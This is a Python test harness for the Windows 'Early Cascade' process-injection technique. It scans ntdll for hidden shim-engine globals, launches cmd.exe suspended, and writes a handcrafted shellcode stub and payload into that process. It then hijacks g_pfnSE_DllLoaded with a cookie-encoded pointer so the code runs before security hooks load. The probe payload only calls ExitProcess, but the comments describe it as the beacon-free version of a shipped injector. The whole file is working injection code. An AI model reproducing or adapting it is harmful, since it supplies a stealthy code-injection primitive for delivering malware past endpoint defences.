# -*- coding: utf-8 -*-
"""ec_stage2_harness.py - local, beacon-free EC stage-2 isolation.
Flow = exactly inject_via_earlycascade minus the beacon:
  1. scan the on-disk ntdll for the anchor RVAs (mirror earlycascade_scan)
  2. CreateProcessW(target, CREATE_SUSPENDED)
  3. VirtualAllocEx stub (RW->RX) + payload (RX) in the target
  4. arm: g_ShimsEnabled=1, g_pfnSE_DllLoaded=rol64(stub^cookie, 64-(c&63))
  5. ResumeThread; payload probe = ExitProcess(0x1337)
  exit code 0x1337 => stub v4 APC chain works; else WER dump tells where.
--stub v3 : the shipped stub (known bad: missing add rsp)
--stub v4 : add rsp,0x28 restored before ret
"""
import ctypes
import struct
import subprocess
import sys
import time
from ctypes import wintypes

k32 = ctypes.windll.kernel32

class STARTUPINFOW(ctypes.Structure):
    _fields_ = [("cb", wintypes.DWORD), ("lpReserved", wintypes.LPWSTR),
                ("lpDesktop", wintypes.LPWSTR), ("lpTitle", wintypes.LPWSTR),
                ("dwX", wintypes.DWORD), ("dwY", wintypes.DWORD),
                ("dwXSize", wintypes.DWORD), ("dwYSize", wintypes.DWORD),
                ("dwXCountChars", wintypes.DWORD), ("dwYCountChars", wintypes.DWORD),
                ("dwFillAttribute", wintypes.DWORD), ("dwFlags", wintypes.DWORD),
                ("wShowWindow", wintypes.WORD), ("cbReserved2", wintypes.WORD),
                ("lpReserved2", ctypes.c_void_p), ("hStdInput", wintypes.HANDLE),
                ("hStdOutput", wintypes.HANDLE), ("hStdError", wintypes.HANDLE)]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [("hProcess", wintypes.HANDLE), ("hThread", wintypes.HANDLE),
                ("dwProcessId", wintypes.DWORD), ("dwThreadId", wintypes.DWORD)]

k32.GetModuleHandleW.restype = ctypes.c_void_p
k32.GetProcAddress.restype = ctypes.c_void_p
k32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
k32.CreateProcessW.argtypes = [wintypes.LPCWSTR, wintypes.LPWSTR, wintypes.LPVOID,
                               wintypes.LPVOID, wintypes.BOOL, wintypes.DWORD,
                               wintypes.LPVOID, wintypes.LPCWSTR,
                               ctypes.POINTER(STARTUPINFOW),
                               ctypes.POINTER(PROCESS_INFORMATION)]
k32.VirtualAllocEx.restype = ctypes.c_void_p
k32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t,
                               wintypes.DWORD, wintypes.DWORD]
k32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPVOID,
                                   ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
k32.ReadProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPVOID,
                                  ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
k32.VirtualProtectEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t,
                                 wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
k32.ResumeThread.argtypes = [wintypes.HANDLE]
k32.OpenProcess.restype = wintypes.HANDLE
k32.CreateRemoteThread.restype = wintypes.HANDLE

GENERIC_RW = 0x80000000 | 0x40000000
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_RW = 0x04
PAGE_ER = 0x20
PAGE_ERW = 0x40
CREATE_SUSPENDED = 0x4
NTDLL_PATH = r"C:\Windows\System32\ntdll.dll"

# ---------------- anchor scan on the on-disk image ----------------
def scan_anchors():
    data = open(NTDLL_PATH, "rb").read()
    e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]
    nsec = struct.unpack_from("<H", data, e_lfanew + 6)[0]
    opt_size = struct.unpack_from("<H", data, e_lfanew + 20)[0]
    sec0 = e_lfanew + 24 + opt_size
    secs = []
    for i in range(nsec):
        off = sec0 + i * 40
        name = data[off:off + 8].rstrip(b"\x00").decode()
        vsz = struct.unpack_from("<I", data, off + 8)[0]
        rva = struct.unpack_from("<I", data, off + 12)[0]
        rawsz = struct.unpack_from("<I", data, off + 16)[0]
        raw = struct.unpack_from("<I", data, off + 20)[0]
        chars = struct.unpack_from("<I", data, off + 36)[0]
        secs.append((name, rva, vsz, raw, rawsz, chars))
    def rva2off(r):
        for nm, srva, vsz, raw, rawsz, ch in secs:
            if srva <= r < srva + max(vsz, rawsz):
                return raw + (r - srva)
        return None
    def sec_of(r):
        for nm, srva, vsz, raw, rawsz, ch in secs:
            if srva <= r < srva + vsz:
                return nm, ch
        return None, 0

    text = [s for s in secs if s[0] == ".text"][0]
    tname, trva, tvsz, traw, trawsz, tchars = text
    tdata = data[traw:traw + trawsz]
    hits = {}
    cookie_site = None
    # anchor A
    for k in range(len(tdata) - 24):
        if (tdata[k:k+7] == b"\x8b\x14\x25\x30\x03\xfe\x7f"
                and tdata[k+7:k+12] == b"\xb8\x40\x00\x00\x00"
                and tdata[k+12:k+15] == b"\x48\x8b\x3d"):
            disp = struct.unpack_from("<i", tdata, k + 15)[0]
            insn_rva = trva + k + 19
            hits["pfn"] = insn_rva + disp
            cookie_site = trva + k
    # anchor B (strict): cmp byte [rip+X],r15b + jne near cookie site
    for k in range(len(tdata) - 13):
        if tdata[k:k+3] == b"\x44\x38\x3d" and tdata[k+7:k+9] == b"\x0f\x85":
            disp = struct.unpack_from("<i", tdata, k + 3)[0]
            insn_rva = trva + k + 7
            tgt = insn_rva + disp
            nm, ch = sec_of(tgt)
            if not nm or not (ch & 0x80000000) or (ch & 0x20000000):
                continue
            jd = struct.unpack_from("<i", tdata, k + 9)[0]
            jt = trva + k + 13 + jd
            if -0x40 < jt - cookie_site < 0x40:
                hits["shims"] = tgt
    return hits

# ---------------- stub builder (mirror ec_build_stub) ----------------
def build_stub(version, shims, payload_addr, ntqapc, param):
    st = bytearray(b"\xCC" * 0x60)
    st[0x00:0x02] = b"\x48\xb8"
    st[0x02:0x0A] = struct.pack("<Q", shims)
    st[0x0A:0x0D] = b"\xc6\x00\x00"
    st[0x0D:0x0F] = b"\x49\xb8"
    st[0x0F:0x17] = struct.pack("<Q", param)
    st[0x17:0x19] = b"\x48\xb8"
    st[0x19:0x21] = struct.pack("<Q", payload_addr)
    st[0x21:0x24] = b"\x48\x89\xc2"
    st[0x24:0x27] = b"\x4d\x31\xc9"
    st[0x27:0x2B] = b"\x48\x83\xec\x28"
    st[0x2B:0x30] = b"\x48\xc7\x44\x24\x20"
    st[0x30:0x34] = struct.pack("<i", 0)
    st[0x33:0x36] = b"\x48\xc7\xc1"
    st[0x36:0x3A] = struct.pack("<i", -2)
    st[0x3A:0x3C] = b"\x48\xb8"
    st[0x3C:0x44] = struct.pack("<Q", ntqapc)
    st[0x44:0x46] = b"\xff\xd0"
    if version >= 4:
        st[0x46:0x4A] = b"\x48\x83\xc4\x28"
        st[0x4A:0x4B] = b"\xc3"
    else:
        st[0x46:0x47] = b"\xc3"
    return bytes(st)

def rol64(v, n):
    n &= 63
    v &= (1 << 64) - 1
    return ((v << n) | (v >> (64 - n))) & ((1 << 64) - 1) if n else v

def kcfg_encode(stub_va, cookie):
    return rol64(stub_va ^ cookie, 64 - (cookie & 63))

# ---------------- payload probes ----------------
def probe_exitprocess():
    """ExitProcess(0x1337) - resolves kernel32!ExitProcess in OUR process
    (same machine: module bases are per-boot global)."""
    h = k32.GetModuleHandleW("kernel32.dll")
    ep = k32.GetProcAddress(h, b"ExitProcess")
    sc = (b"\x48\x83\xec\x28"
          + b"\xb9\x37\x13\x00\x00"
          + b"\x48\xb8" + struct.pack("<Q", ep)
          + b"\xff\xd0")
    return sc

# ---------------- main ----------------
def main():
    version = 4
    for a in sys.argv:
        if a == "--stubv3":
            version = 3
    hits = scan_anchors()
    print("anchors: pfn=0x%x shims=0x%x" % (hits["pfn"], hits["shims"]))
    assert hits.get("pfn") and hits.get("shims")

    nt_base = k32.GetModuleHandleW("ntdll.dll")
    shims = nt_base + hits["shims"]
    pfn = nt_base + hits["pfn"]
    ntq = k32.GetProcAddress(nt_base, b"NtQueueApcThread")
    cookie = ctypes.c_uint32.from_address(0x7FFE0330).value
    print("ntdll=0x%x ntq=0x%x cookie=0x%x" % (nt_base, ntq, cookie))

    si = STARTUPINFOW()
    si.cb = ctypes.sizeof(si)
    pi = PROCESS_INFORMATION()
    import os
    target_exe = os.path.join(os.environ["SystemRoot"], "System32", "cmd.exe")
    cmd = ctypes.create_unicode_buffer('"%s" /c ping -n 30 127.0.0.1 >nul' % target_exe)
    if not k32.CreateProcessW(None, cmd, None, None, False,
                              CREATE_SUSPENDED, None, None,
                              ctypes.byref(si), ctypes.byref(pi)):
        print("CreateProcessW failed", k32.GetLastError())
        return 2
    hp, ht, tpid = pi.hProcess, pi.hThread, pi.dwProcessId
    print("target pid", tpid, "suspended")

    stub_va = k32.VirtualAllocEx(hp, None, 0x60, MEM_COMMIT | MEM_RESERVE, PAGE_RW)
    pay_va = k32.VirtualAllocEx(hp, None, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_ERW)
    print("stub=0x%x payload=0x%x" % (stub_va, pay_va))

    payload = probe_exitprocess()
    stub = build_stub(version, shims, pay_va, ntq, 0)  # param=0 for the probe
    got = ctypes.c_size_t(0)
    ok1 = k32.WriteProcessMemory(hp, stub_va, stub, len(stub), ctypes.byref(got))
    ok2 = k32.WriteProcessMemory(hp, pay_va, payload, len(payload), ctypes.byref(got))
    old = wintypes.DWORD(0)
    ok3 = k32.VirtualProtectEx(hp, stub_va, 0x60, PAGE_ER, ctypes.byref(old))
    print("writes: stub=%s pay=%s protect=%s" % (bool(ok1), bool(ok2), bool(ok3)))

    one = b"\x01"
    k32.WriteProcessMemory(hp, shims, one, 1, ctypes.byref(got))
    enc = struct.pack("<Q", kcfg_encode(stub_va, cookie))
    k32.WriteProcessMemory(hp, pfn, enc, 8, ctypes.byref(got))
    # verify what landed
    back = (ctypes.c_char * 8)()
    k32.ReadProcessMemory(hp, ctypes.c_void_p(pfn), back, 8, ctypes.byref(got))
    print("pfn now:", struct.unpack("<Q", back.raw)[0] == kcfg_encode(stub_va, cookie))

    k32.ResumeThread(ht)
    code = wintypes.DWORD(0)
    t0 = time.time()
    while time.time() - t0 < 20:
        if k32.WaitForSingleObject(hp, 1000) == 0:
            break
    still = k32.GetExitCodeProcess(hp, ctypes.byref(code))
    alive = code.value == 259
    print("ver=%d exit=0x%x alive=%s" % (version, code.value, alive))
    if alive:
        k32.TerminateProcess(hp, 1)
    k32.CloseHandle(ht)
    k32.CloseHandle(hp)
    print("VERDICT:", "PASS" if code.value == 0x1337 else "FAIL")

if __name__ == "__main__":
    main()
